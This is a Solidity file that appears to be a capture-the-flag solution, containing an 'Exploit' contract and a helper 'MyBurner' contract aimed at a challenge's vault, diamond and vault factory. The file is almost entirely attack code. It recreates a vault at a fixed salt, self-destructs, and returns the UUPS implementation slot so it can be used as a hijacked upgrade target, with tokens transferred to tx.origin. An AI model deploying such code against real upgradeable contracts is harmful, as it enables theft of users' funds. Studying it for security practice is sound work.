// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

interface IChallenge {
    function vault() external view returns (address);
    function diamond() external view returns (address);
    function vaultFactory() external view returns (address);
    function hexensCoin() external view returns (address);
    function claim() external;
    function isSolved() external view returns (bool);
}

interface IHex {
    function delegate(address delegatee) external;
    function getCurrentVotes(address account) external view returns (uint256);
    function transfer(address, uint256) external;
}

interface IVault {
    function governanceCall(bytes calldata data) external;
    function burn(address token, uint256 amount) external;
    function initialize(address diamond_, address hexensCoin_) external;
    function upgradeTo(address newImplementation) external;
    function selfDestructVault() external;
}

interface IVaultFactory {
    function createVault(bytes32 salt_) external;
}

contract MyBurner {
    constructor(address _token) {
        IHex(_token).transfer(tx.origin, 31337);
    }
}

contract Exploit {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor() {}

    function myBurn(address diamond) external {
        new MyBurner(diamond);
    }

    function reCreateVault(address vaultFactory) external {
        IVaultFactory(vaultFactory).createVault(
            keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter.")
        );
    }

    function selfDestructVault() external {
        selfdestruct(payable(address(this)));
    }

    function proxiableUUID() external view returns (bytes32 slot) {
        return _IMPLEMENTATION_SLOT;
    }
}
